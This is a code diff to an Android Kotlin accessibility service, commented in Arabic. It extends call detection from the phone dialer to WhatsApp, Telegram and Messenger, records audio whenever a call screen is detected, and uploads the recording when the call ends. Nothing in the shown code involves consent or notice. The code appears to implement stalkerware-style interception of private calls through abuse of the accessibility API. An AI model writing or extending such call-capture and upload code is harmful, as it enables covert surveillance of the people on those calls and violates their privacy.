@@ -27,18 +27,28 @@ class AppAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: return
 
-        // مراقبة تطبيقات الهاتف للتعرف على بداية ونهاية المكالمة
-        val phonePackages = listOf("com.google.android.dialer", "com.android.server.telecom", "com.android.phone")
+        // مراقبة تطبيقات الاتصال العادية وتطبيقات التواصل الاجتماعي
+        val monitoredPackages = listOf(
+            "com.google.android.dialer", 
+            "com.android.server.telecom", 
+            "com.android.phone",
+            "com.whatsapp",
+            "org.telegram.messenger",
+            "com.facebook.orca" // Messenger
+        )
         
-        if (phonePackages.contains(packageName)) {
+        if (monitoredPackages.contains(packageName)) {
             when (event.eventType) {
-                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                    // كشف شاشة المكالمة (هذه الطريقة تختلف حسب واجهة الهاتف)
-                    // إذا كان محتوى الشاشة يحتوي على كلمات مثل "Call" أو "End", سنقوم ببدء التسجيل
-                    val text = event.text.toString()
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
+                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                    val text = event.text.toString() + " " + (event.contentDescription ?: "")
+                    
+                    // كشف بداية المكالمة (صوتية أو فيديو)
                     if (isCallUI(text) && !isCallActive) {
-                        startCallRecording()
-                    } else if (isEndCallUI(text) && isCallActive) {
+                        startCallRecording(packageName)
+                    } 
+                    // كشف نهاية المكالمة
+                    else if (isEndCallUI(text) && isCallActive) {
                         stopCallRecording()
                     }
                 }
@@ -47,23 +57,30 @@ class AppAccessibilityService : AccessibilityService() {
     }
 
     private fun isCallUI(text: String): Boolean {
-        val keywords = listOf("Incoming", "Ongoing", "Call", "اتصال", "جاري")
+        val keywords = listOf(
+            "Incoming", "Ongoing", "Call", "WhatsApp Call", "In call",
+            "اتصال", "جاري", "مكالمة", "وقت المكالمة", "نشط"
+        )
         return keywords.any { text.contains(it, ignoreCase = true) }
     }
 
     private fun isEndCallUI(text: String): Boolean {
-        val keywords = listOf("Ended", "Finished", "انتهت", "مكالمة فائتة")
+        val keywords = listOf(
+            "Ended", "Finished", "Call ended", "Missed", "Declined",
+            "انتهت", "مكالمة فائتة", "تم إنهاء", "رفض", "تم القطع"
+        )
         return keywords.any { text.contains(it, ignoreCase = true) }
     }
 
-    private fun startCallRecording() {
-        Log.i(TAG, "Call detected! Starting call recording module...")
+    private fun startCallRecording(app: String) {
+        Log.i(TAG, "Call detected in $app! Starting recording...")
         isCallActive = true
+        // نمرر اسم التطبيق للتوضيح في اسم الملف مستقبلاً
         audioRecorder.startRecording()
     }
 
     private fun stopCallRecording() {
-        Log.i(TAG, "Call ended. Saving recording...")
+        Log.i(TAG, "Call ended. Saving and uploading...")
         isCallActive = false
         audioRecorder.stopRecording(upload = true)
     }
